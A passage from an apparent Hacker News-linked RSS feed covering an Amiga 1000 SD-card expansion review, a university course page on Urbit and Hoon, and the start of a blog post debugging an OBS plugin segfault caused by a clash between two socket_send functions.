<li> SD Card Reader with 2GB MicroSD. It comes pre-formatted with the FAT32  file system and is readable on any PC as a result. This way you can quickly set up your new SD-based hard drive.</li></ol> <p>

It’s worth mentioning that this is running on period correct Amiga OS 1.3, too. </p><div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6151&amp;sid=99a06cb58ec17764521616e0643319f1" alt="IMG_1080_b.jpg" onclick="viewableArea(this);"></dt>
			<dd><em>She is almost completely camouflaged into the Amiga battlestation at this point.</em></dd>			<!-- <dd>IMG_1080_b.jpg (259.01 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<p>
Possibly the best unseen feature is the silkscreen prints Dunklee put around the various chips and resistors on the board. It’s a complete sci-fi treasure trove of labelling, from Back to the Future to Battlestar Galactica. </p><div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6153&amp;sid=99a06cb58ec17764521616e0643319f1" alt="IMG_1055_b.jpg" onclick="viewableArea(this);"></dt>
						<!-- <dd>IMG_1055_b.jpg (268.24 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6152&amp;sid=99a06cb58ec17764521616e0643319f1" alt="IMG_1054_b.jpg" onclick="viewableArea(this);"></dt>
						<!-- <dd>IMG_1054_b.jpg (380.51 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6154&amp;sid=99a06cb58ec17764521616e0643319f1" alt="IMG_1058_b.jpg" onclick="viewableArea(this);"></dt>
			<dd><em>This is where the brilliance really starts to shine.</em></dd>			<!-- <dd>IMG_1058_b.jpg (495.27 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6155&amp;sid=99a06cb58ec17764521616e0643319f1" alt="circuitboard-cu.jpg" onclick="viewableArea(this);"></dt>
			<dd><em>Yes, you've actually died and gone to heaven via worm hole.</em></dd>			<!-- <dd>circuitboard-cu.jpg (689.75 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<p>
For his fantastic creativity on the silkscreen, I half-jokingly suggested to Mr. Dunklee a future 3D printed case in clear acrylic so I could totally nerd out with his hilarious labels. And I think he might actually take me up on that idea some day! </p><div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6156&amp;sid=99a06cb58ec17764521616e0643319f1" alt="clear-acryllic-case-parceiro.jpg" onclick="viewableArea(this);"></dt>
			<dd><em>UPDATE: He works really fast!</em></dd>			<!-- <dd>clear-acryllic-case-parceiro.jpg (248.37 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<p>
The Parceiro comes with instructions for creating your own KickWork disk to quickly boot up your machine and install all of the necessary software to run the device. This includes the necessary updates to your Mountlist, Startup-Sequence, adding fat95 drivers as well as the sd.device drivers. </p><p>

The <a href="https://amigalove.com/viewtopic.php?f=7&amp;t=312">KickWork disk idea</a> is based off a product developed in 1988 by Mr. Rudolph Loew (RIP). This is where a Kickstart disk is combined with a stripped down Workbench disk for faster machine boot ups off a single floppy rather than 2. </p><p>

With the Parceiro, Dunklee provides six pages of detailed instructions for getting you up and running in no time. The idea here is the modified KickWork (or Workbench) disk will begin the machine’s boot up process like normal then hand over total control to the SD card like a full-fledged autobooting hard drive. It’s not 100% autobooting, but it’s pretty danged close. And once the machine fully boots you just pop out the boot floppy disk and set it to the side. Mr Dunklee confided with me that in a distant hardware update he might take the next logical step and integrate an FPGA for a true autobooting experience. </p><p>

Since my machine is equipped with a Rejuvenator board, I didn’t need a KickWork disk. So I made a customized Workbench boot disk making the necessary adjustments following Mr Dunklee’s instructions for the RTC software, the SD card device driver and adding the FAT file system library. </p><p>

In the Amiga world, this is about as close to plug-and-play for a device with this many features that I’ve ever come across that doesn’t completely take over your machine and its identity like a Vampire, or some might argue even the ACA500+ (which basically uses the A1000's power to mostly take over). The Parceiro installation was absolutely seamless and I got it up and running without a hitch. </p><p>

Now some of you might be wondering how long it takes to boot this 2GB equipped Amiga. For example, on my Amiga 2000 I have a 40 MB mechanical boot drive, but I also have a SCSI2SD card with 2GB MicroSD for all of my software and data storage. When that machine boots it can sit on a gray screen for about 20 -25 seconds while the large drive is being validated. Once that process is done the A2K snaps to life and I’m on my way. </p><p>

With the Parceiro it’s a very different - and better - experience than I’m used to. The Parceiro still needs to validate the empty space on the drive, but instead it does it in the background. So the Amiga 1000 boots up without that normal long pause. While the background validation is going on, the volume is set to READ ONLY. I can still run programs but I simply can’t write to the drive while the validation is going on. To be honest I wouldn’t even know about this had it not been noted in the instructions, as I’m virtually never writing to the drive the moment I boot it up. And within a few seconds the little Cylon red LED light stops flickering and I know then it’s job is complete (which didn’t directly affect me anyway). </p><p>

Very, very cool! </p><p>

Now, this device is currently in extremely short supply. In fact, I happened to get S/N #1 and I know S/N #2 was sold a few hours after I got mine. At that stage the inventory was sold out. But several more will eventually get made over time so if you’re an Amiga 1000 fan that means you're patient by default. <img src="https://www.amigalove.com/images/smilies/icon_e_wink.gif" width="15" height="17" alt=";)" title="Wink"> I’d highly recommend you keep this on your radar and try to snag one of them for yourself. It’s simply bad ass and it didn’t require me to upgrade my OS beyond adding new drivers - or really change anything - like a lot of modern upgrades often do.  </p><p>

The Parceiro is a fantastic device, made in the USA, and is a very worthy successor to the Microbotics and Supra offerings from BITD. It is one of the few modern devices that is 100% designed for the Amiga 1000 for a change. And how cool and refreshing is that? </p><p>


<strong>Pre-Orders</strong></p><p>

If you’d like to pre-order one of these little technological marvels for yourself at a nearly <strong>20% discounted rate at $195</strong>, simply email <a href="https://www.amigalove.com/cdn-cgi/l/email-protection#1f5e7276787e314f7e6d7c7a766d705f706a6b73707074317c7072"><span data-cfemail="e9a884808e88c7b9889b8a8c809b86a9869c9d85868682c78a8684">[email&nbsp;protected]</span></a> to declare your interest <strong>and mention AmigaLove sent you</strong>. You will still need to cover expenses for shipping, of course, but you’ll get in line for your very own Parceiro. David Dunklee will manage the rest from there!</p></div></div>]]>
            </description>
            <link>https://www.amigalove.com/viewtopic.php?t=1689</link>
            <guid isPermaLink="false">hacker-news-small-sites-25818159</guid>
            <pubDate>Mon, 18 Jan 2021 04:28:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CS 498MC • Martian Computing]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25818136">thread link</a>) | @todsacerdoti
<br/>
January 17, 2021 | https://davis68.github.io/martian-computing/ | <a href="https://web.archive.org/web/*/https://davis68.github.io/martian-computing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <header>
        
        
        

        <p>CS 498MC Martian Computing at the University of Illinois at Urbana–Champaign</p>

        
        <p><a href="https://github.com/davis68/martian-computing">View the Project on GitHub <small>davis68/martian-computing</small></a></p>
        

        

        
      </header>
      <section>

      
<h4 id="neal-davis--department-of-computer-science--university-of-illinois">Neal Davis • Department of Computer Science • University of Illinois</h4>

<p><img src="https://davis68.github.io/martian-computing/img/mars-landscape-hero.png" alt=""></p>

<p>The underlying infrastructure of modern networked computing—namely Unix and its derivatives—is approaching fifty years of age.  What will come to replace it?  A strong competitor is the clean-slate “operating function” approach of Urbit.  Jocosely branded as “computing for Martians,” Urbit provides a fresh and updated vision of what Internet computing could come to look like in future years.  Featuring end-to-end encryption and true peer-to-peer routing built on a network-first operating system, Urbit fosters decentralized digital societies and stable user identities.</p>

<p>Our primary objectives in this course are for you to be able to explain and navigate the technical layout of Urbit, as well as construct novel applications for Arvo, the Urbit operating function, using the Hoon programming language.</p>

<ul>
  <li>Understand the schematics and technical implementation of the Urbit OS kernel (Arvo and vanes).</li>
  <li>Navigate and utilize the Urbit ID public-key infrastructure (Azimuth).</li>
  <li>Program literately using the Hoon language, including source code conventions and interoperability.</li>
  <li>Construct userspace apps to run on the Urbit OS platform (Gall, Landscape).</li>
</ul>

<h2 id="audience">Audience</h2>

<p>My target audience for the course consists of graduate students and seniors in computer science and neighboring fields interested in sound computing and functional operating system design (functional-as-in-language).  The course assumes an interest in functional programming but no specific experience<a href="https://en.wikipedia.org/wiki/Centzon_T%C5%8Dt%C5%8Dchtin">.</a>  <!-- egg --></p>

<h2 id="resources">Resources</h2>

<table>
  <thead>
    <tr>
      <th>What</th>
      <th>When and Where</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Instructor email</strong></td>
      <td><a href="mailto:cs498mcadmin@illinois.edu?subject=CS498MC">cs498mcadmin@illinois.edu</a></td>
    </tr>
    <tr>
      <td><strong>Class URL</strong></td>
      <td><a href="https://go.illinois.edu/cs498mc">go.illinois.edu/cs498mc</a></td>
    </tr>
    <tr>
      <td><strong>Class forum</strong></td>
      <td><code>~magbel/martian-computing</code></td>
    </tr>
  </tbody>
</table>

<h2 id="access">Access</h2>

<p><img src="https://davis68.github.io/martian-computing/img/mars-pathfinder-hero.png" alt=""></p>

<p>The use of Urbit requires an <a href="https://urbit.org/using/install/">Urbit ID</a>.  You can purchase an ID on a third-party site like <a href="https://urbit.live/">urbit.live</a> or <a href="https://opensea.io/">OpenSea</a>.  You can also use a transient ID (called a “comet”) as a permanent ID; these are free and can be generated on your own machine.</p>

<h2 id="agenda">Agenda</h2>

<p><img src="https://davis68.github.io/martian-computing/img/mars-olympus-mons-hero.png" alt=""></p>

<p>Lessons focus on conceptual or architectural aspects of Urbit, including technical discussions of Urbit’s behavior and internals.  Labs are hands-on tutorials to familiarize students with operations and language features.</p>

<table>
  <thead>
    <tr>
      <th>Wk</th>
      <th>Date</th>
      <th>Number</th>
      <th>Lecture</th>
      <th>Lab</th>
      <th>MP</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0</td>
      <td>08/26</td>
      <td>00</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson00-prospectus.html">Prospectus</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>08/28</td>
      <td>01</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson01-dojo.html">Dojo</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>1</td>
      <td>08/31</td>
      <td>02</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson02-azimuth-1.html">Azimuth I</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/02</td>
      <td>03</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson03-generators.html">Generators</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/04</td>
      <td>04</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson04-aura.html">Auras</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>2</td>
      <td>09/09</td>
      <td>05</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson05-syntax.html">Syntax</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/11</td>
      <td>06</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson06-cores.html">Cores</a></td>
      <td>&nbsp;</td>
      <td><code>mp0</code></td>
    </tr>
    <tr>
      <td>3</td>
      <td>09/14</td>
      <td>07</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson07-say-generators.html"><code>%say</code> Generators</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/16</td>
      <td>08</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson08-subject-oriented-programming.html">Subject-Oriented Programming</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/18</td>
      <td>09</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson09-clay-1.html">Clay I</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>4</td>
      <td>09/21</td>
      <td>10</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson10-libraries.html">Libraries</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/23</td>
      <td>11</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson11-ford-1.html">Ford I</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/25</td>
      <td>12</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson12-debugging.html">Debugging Hoon</a></td>
      <td>&nbsp;</td>
      <td><code>mp1</code></td>
    </tr>
    <tr>
      <td>5</td>
      <td>09/28</td>
      <td>13</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson13-ask.html"><code>%ask</code> Generators</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/30</td>
      <td>14</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson14-typechecking.html">Types &amp; Molds</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/02</td>
      <td>15</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson15-stdlib.html">Standard Library</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>6</td>
      <td>10/05</td>
      <td>16</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson16-containers.html">Common Containers</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/07</td>
      <td>17</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson17-gall-1.html">Gall I</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/09</td>
      <td>18</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson18-kernel.html">Kernel</a> (Chat with <code>~rovnys-ricfer</code>)</td>
      <td>&nbsp;</td>
      <td><code>mp2</code></td>
    </tr>
    <tr>
      <td>7</td>
      <td>10/12</td>
      <td>19</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson19-text-parsing.html">Data &amp; Text Parsing</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/14</td>
      <td>20</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson20-ames.html">Ames</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/16</td>
      <td>21</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson21-behn.html">Behn</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>8</td>
      <td>10/19</td>
      <td>22</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson22-clay-2.html">Clay II</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/21</td>
      <td>23</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson23-polymorphism.html">Polymorphism</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/23</td>
      <td>24</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson24-foundation.html">Urbit Foundation</a> (Chat with <code>~wolref-podlex</code>)</td>
      <td>&nbsp;</td>
      <td><code>mp3</code></td>
    </tr>
    <tr>
      <td>9</td>
      <td>10/26</td>
      <td>25</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson25-gall-2.html">Gall II</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/28</td>
      <td>26</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson26-gall-3-landscape.html">Gall III</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/30</td>
      <td>27</td>
      <td>Buffer</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>10</td>
      <td>11/02</td>
      <td>28</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson28-eyre-iris.html">Eyre &amp; Iris</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>11/04</td>
      <td>29</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson29-gall-4-communication.html">Gall IV</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>11/06</td>
      <td>30</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson30-boot-process.html">Boot Process</a></td>
      <td>&nbsp;</td>
      <td><code>mp4</code></td>
    </tr>
    <tr>
      <td>11</td>
      <td>11/09</td>
      <td>31</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson31-cli.html">CLI</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>11/11</td>
      <td>32</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson32-arvo-1.html">Arvo I</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>11/13</td>
      <td>33</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson33-hoon-1.html">Hoon I</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>12</td>
      <td>11/16</td>
      <td>34</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson34-hoon-2.html">Hoon II</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>11/18</td>
      <td>35</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson35-vere-1.html">Vere I</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>11/20</td>
      <td>36</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson36-vere-2.html">Vere II</a></td>
      <td>&nbsp;</td>
      <td><code>mp5</code></td>
    </tr>
    <tr>
      <td>13</td>
      <td>11/30</td>
      <td>37</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson37-arvo-2.html">Arvo II</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>12/02</td>
      <td>38</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson38-nock-1.html">Nock I</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>12/04</td>
      <td>39</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson39-nock-2.html">Nock II</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>14</td>
      <td>12/07</td>
      <td>40</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson40-azimuth-2.html">Azimuth II</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>12/09</td>
      <td>41</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson41-final-thoughts.html">Final Thoughts</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>12/11</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>mp6</code></td>
    </tr>
  </tbody>
</table>


      </section>
      
    </div></div>]]>
            </description>
            <link>https://davis68.github.io/martian-computing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25818136</guid>
            <pubDate>Mon, 18 Jan 2021 04:25:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracking down a segfault that suddenly started happening]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25818126">thread link</a>) | @zdw
<br/>
January 17, 2021 | https://www.downtowndougbrown.com/2021/01/tracking-down-a-segfault-that-suddenly-started-happening/ | <a href="https://web.archive.org/web/*/https://www.downtowndougbrown.com/2021/01/tracking-down-a-segfault-that-suddenly-started-happening/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
<p>I wanted to share a story of a segmentation fault I helped track down this weekend. I thought the final root cause of the segfault was interesting because of how unrelated it was to the code I was trying to debug.</p>



<p>I’ve been maintaining a <a rel="noreferrer noopener" href="https://github.com/dougg3/obs-ios-camera-source" data-type="URL" data-id="https://github.com/dougg3/obs-ios-camera-source" target="_blank">Linux fork</a> of <a rel="noreferrer noopener" href="https://github.com/wtsnz/obs-ios-camera-source" target="_blank" data-type="URL" data-id="https://github.com/wtsnz/obs-ios-camera-source">obs-ios-camera-source</a>, which is an <a rel="noreferrer noopener" href="https://obsproject.com/" target="_blank" data-type="URL" data-id="https://obsproject.com/">OBS</a> plugin that allows you to use an iPhone or iPad’s camera and microphone as a video and audio source in OBS. It works in conjunction with the “<a rel="noreferrer noopener" href="https://obs.camera/" target="_blank">Camera for OBS Studio</a>” app in the App Store. This kind of thing is useful for online streamers who want to use their phone’s camera instead of buying a separate camera. For those of you who don’t know, OBS is short for Open Broadcaster Software. A lot of streamers use it to handle broadcasting their stream. It allows you to capture audio and video, mix it all together, do all kinds of cool things with it, and then record the final result and/or stream it to sites such as YouTube and Twitch.</p>



<p>Getting this plugin working on Linux wasn’t really complicated, because it was already well-written without much platform-specific code. After all, the existing codebase was already operational on both macOS and Windows. It mostly just required tweaking a few compile/link options to make the code run happily on Linux.</p>



<p>Anyway, I’m pretty sure a good number of people have been using my Linux port of this plugin without issues. I know it works fine for me when I test with it in Ubuntu 18.04 or 20.04. I’ve helped people on other distros get it working too. I don’t really do any streaming myself — maybe someday though!</p>



<p>On Friday, GitHub user rrondeau <a rel="noreferrer noopener" href="https://github.com/dougg3/obs-ios-camera-source/issues/4" data-type="URL" data-id="https://github.com/dougg3/obs-ios-camera-source/issues/4" target="_blank">reported an issue</a>: after a half a year of the obs-ios-camera-source plugin working without a problem, it suddenly started causing OBS to segfault on his computer (currently running Fedora 33). He provided a stack trace that showed that the segfault was happening because of something initiated by the plugin. Afterward, he used GDB to get a better stack trace that provided more info about the functions being called and the parameters being passed:</p>


<pre title="">#0  0x00007fffee7abc64 in socket_send () at /usr/lib64/samba/libsamba-sockets-samba4.so
#1  0x00007fff88b7813c in send_packet (sfd=50, message=8, tag=1, payload=0x1b22e60, payload_size=488) at /home/rrondeau/git/perso/obs-ios-camera-source/deps/libusbmuxd/src/libusbmuxd.c:400
#2  0x00007fff88b782a6 in send_plist_packet (sfd=50, tag=1, message=0x1ae53e0) at /home/rrondeau/git/perso/obs-ios-camera-source/deps/libusbmuxd/src/libusbmuxd.c:431
#3  0x00007fff88b7851b in send_list_devices_packet (sfd=50, tag=1) at /home/rrondeau/git/perso/obs-ios-camera-source/deps/libusbmuxd/src/libusbmuxd.c:499
#4  0x00007fff88b79367 in usbmuxd_get_device_list (device_list=0x7fffffffc740) at /home/rrondeau/git/perso/obs-ios-camera-source/deps/libusbmuxd/src/libusbmuxd.c:938
#5  0x00007fff88b725e1 in portal::Portal::addConnectedDevices() (this=0x1909378) at /home/rrondeau/git/perso/obs-ios-camera-source/deps/portal/src/Portal.cpp:109
#6  0x00007fff88b72684 in portal::Portal::reloadDeviceList() (this=0x1909378) at /home/rrondeau/git/perso/obs-ios-camera-source/deps/portal/src/Portal.cpp:126
#7  0x00007fff88b722db in portal::Portal::Portal(portal::PortalDelegate*) (this=0x1909378, delegate=0x1909240) at /home/rrondeau/git/perso/obs-ios-camera-source/deps/portal/src/Portal.cpp:57
#8  0x00007fff88b67053 in IOSCameraInput::IOSCameraInput(obs_source*, obs_data*) (this=0x1909240, source_=0x1aee000, settings=0x19210a0)
    at /home/rrondeau/git/perso/obs-ios-camera-source/src/obs-ios-camera-source.cpp:74
#9  0x00007fff88b66358 in CreateIOSCameraInput(obs_data_t*, obs_source_t*) (settings=0x19210a0, source=0x1aee000) at /home/rrondeau/git/perso/obs-ios-camera-source/src/obs-ios-camera-source.cpp:371
#10 0x00007ffff6259c2a in obs_source_create_internal () at /lib64/libobs.so.0
#11 0x00007ffff626bb81 in obs_load_source_type () at /lib64/libobs.so.0
#12 0x00007ffff626e3c2 in obs_load_sources () at /lib64/libobs.so.0
#13 0x000000000049e750 in OBSBasic::Load(char const*) (this=0xa370b0, file=0x7fffffffd040 "/home/rrondeau/.config/obs-studio/basic/scenes/Untitled.json")
    at /home/rrondeau/git/perso/obs-studio/UI/window-basic-main.cpp:973
#14 0x00000000004a2976 in OBSBasic::OBSInit() (this=0xa370b0) at /home/rrondeau/git/perso/obs-studio/UI/window-basic-main.cpp:1783
#15 0x000000000047feff in OBSApp::OBSInit() (this=0x7fffffffd690) at /home/rrondeau/git/perso/obs-studio/UI/obs-app.cpp:1415
#16 0x0000000000482503 in run_program(std::fstream&amp;amp;, int, char**) (logFile=..., argc=1, argv=0x7fffffffdd68) at /home/rrondeau/git/perso/obs-studio/UI/obs-app.cpp:2052
#17 0x0000000000484203 in main(int, char**) (argc=1, argv=0x7fffffffdd68) at /home/rrondeau/git/perso/obs-studio/UI/obs-app.cpp:2697
</pre>


<p>The actual segfault was happening inside of a function called “socket_send” in libsamba-sockets-samba4.so, which was being called by a function in libusbmuxd, which is bundled as part of the obs-ios-camera-source plugin source code and is used for communicating with iOS devices over USB. When I first saw this in the stack trace, my mind thought “Huh…that’s weird. Why does libusbmuxd use Samba’s library for its socket code instead of providing its own?” (<a rel="noreferrer noopener" href="https://www.samba.org/" data-type="URL" data-id="https://www.samba.org/" target="_blank">Samba</a> is an implementation of the Windows file sharing protocol used by pretty much every Linux distribution)</p>



<p>I tested and couldn’t reproduce the issue in Ubuntu. I know basically nothing about Fedora, but I faked my way through grabbing a Fedora 33 virtual machine, installing OBS, and compiling the plugin. I ran into the exact same issue that he was seeing.</p>



<p>Before I had a chance to look deeper and understand what was going on, rrondeau beat me to the correct conclusion: code in Samba’s library was mistakenly being called. <a rel="noreferrer noopener" href="https://github.com/dougg3/obs-ios-camera-source/blob/8181922136e12ef618c8449f95a52e40d7104ded/deps/libusbmuxd/common/socket.h#L61" data-type="URL" data-id="https://github.com/dougg3/obs-ios-camera-source/blob/8181922136e12ef618c8449f95a52e40d7104ded/deps/libusbmuxd/common/socket.h#L61" target="_blank">libusbmuxd has a function called socket_send</a>, but clearly <a href="https://github.com/samba-team/samba/blob/f52f531771d6a25b2e363384bf94a9fa14334e1b/source4/lib/socket/socket.h#L152" data-type="URL" data-id="https://github.com/samba-team/samba/blob/f52f531771d6a25b2e363384bf94a9fa14334e1b/source4/lib/socket/socket.h#L152" target="_blank" rel="noreferrer noopener">libsamba-sockets-samba4’s function that is also named socket_send</a> was accidentally being called instead.</p>



<p>Honestly, that’s all we really needed to know. Renaming libusbmuxd’s socket_send function to something else, and updating all references to it to use the new name, fixed the issue. I still wanted to understand why this suddenly became an issue when it had been working fine prior to that. Why were we calling into Samba libraries? Why does an iOS USB multiplexing library even consider talking to a library associated with Windows file sharing?</p>



<p>Not knowing the answer to that question bothered me. I decided to dig deeper and understand exactly what was going on. I started by using <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Ldd_(Unix)" data-type="URL" data-id="https://en.wikipedia.org/wiki/Ldd_(Unix)" target="_blank">ldd</a>, which lists all dynamic libraries used by a program or library:</p>


<pre title="">[fedora@fedora33 build]$ ldd obs-ios-camera-source.so 
	linux-vdso.so.1 (0x00007fffa599a000)
	libobs.so.0 =&gt; /lib64/libobs.so.0 (0x00007f0a3f688000)
	libavcodec.so.58 =&gt; /lib64/libavcodec.so.58 (0x00007f0a3e2db000)
	libavutil.so.56 =&gt; /lib64/libavutil.so.56 (0x00007f0a3e036000)
...
	libsamba-sockets-samba4.so =&gt; /usr/lib64/samba/libsamba-sockets-samba4.so (0x00007fd6af4b7000)
...
</pre>


<p>I truncated the output because it spit out a very long list of libraries. As we can see from ldd’s output, obs-ios-camera-source.so depends on libsamba-sockets-samba4.so. ldd lists all recursive dependencies as well, and I couldn’t find any references to “samba” in the plugin source code, so this was likely an indirect dependency instead. I confirmed this by using <a href="https://en.wikipedia.org/wiki/Readelf" data-type="URL" data-id="https://en.wikipedia.org/wiki/Readelf" target="_blank" rel="noreferrer noopener">readelf</a> to show only the direct dependencies:</p>


<pre title="">[fedora@fedora33 build]$ readelf -d obs-ios-camera-source.so | grep NEEDED
 0x0000000000000001 (NEEDED)             Shared library: [libobs.so.0]
 0x0000000000000001 (NEEDED)             Shared library: [libavcodec.so.58]
 0x0000000000000001 (NEEDED)             Shared library: [libavutil.so.56]
 0x0000000000000001 (NEEDED)             Shared library: [libobs-frontend-api.so.0]
 0x0000000000000001 (NEEDED)             Shared library: [libstdc++.so.6]
 0x0000000000000001 (NEEDED)             Shared library: [libm.so.6]
